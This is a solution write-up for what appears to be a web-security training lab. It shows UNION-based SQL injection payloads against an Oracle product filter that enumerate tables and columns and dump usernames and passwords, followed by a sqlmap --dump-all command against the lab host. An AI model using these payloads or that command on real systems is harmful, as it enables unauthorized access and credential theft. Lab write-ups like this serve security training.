## SQL injection attack, listing the database contents on Oracle

This lab contains a SQL injection vulnerability in the product category filter. Using a UNION attack, it is possible to enumerate the Oracle database structure and retrieve credentials from the users table.

## Notes

- `/login`
- `/filter?category=parameter`
- Oracle database
- Oracle requires a valid table after every `SELECT`
- `dual` table can be used for this purpose

## Resume

1. Find the number of columns
2. Find a reflected column
3. Enumerate database tables
4. Enumerate table columns
5. Dump usernames and passwords
6. Login as administrator

## Solve

First, determine the number of columns used by the query.

Trying with 3 columns :

```
' UNION SELECT 'abc','def','ghi' FROM dual--
```

returns :

```
Internal Server Error
```

Retrying with 2 columns :

```
' UNION SELECT 'abc','def' FROM dual--
```

successfully displays both values inside the page, confirming that the query contains **2 columns**.

Next, determine which column reflects data using the Oracle version banner :

```
' UNION SELECT NULL,BANNER FROM v$version--
```

and :

```
' UNION SELECT BANNER,NULL FROM v$version--
```

Both payloads display the Oracle database version.

Now enumerate all tables :

```
' UNION SELECT NULL,table_name FROM all_tables--
```

Among the returned tables, the users table is identified :

```
USERS_JUXKOP
```

The next step is to enumerate the columns from this table :

```
' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name = 'USERS_JUXKOP'--
```

This returns the following columns :

- `EMAIL`
- `PASSWORD_XYOUIK`
- `USERNAME_YBZPBX`

Now dump usernames :

```
' UNION SELECT NULL,USERNAME_YBZPBX FROM USERS_JUXKOP--
```

Returned users :

- `administrator`
- `carlos`
- `wiener`

Then dump passwords :

```
' UNION SELECT NULL,PASSWORD_XYOUIK FROM USERS_JUXKOP--
```

Returned passwords :

```
45gc5rftbl3seqyl85i1
bta1mrhjvrl7ngbtdot8
xq8nnxfejd63fhgxejr7
```

Administrator credentials :

```
administrator:45gc5rftbl3seqyl85i1
```

Login using these credentials to solve the lab.

```bash
sqlmap -u 'https://0a39007a0447824980aa080d00e5000a.web-security-academy.net/filter?category=' --dbms=oracle --dump-all --batch
```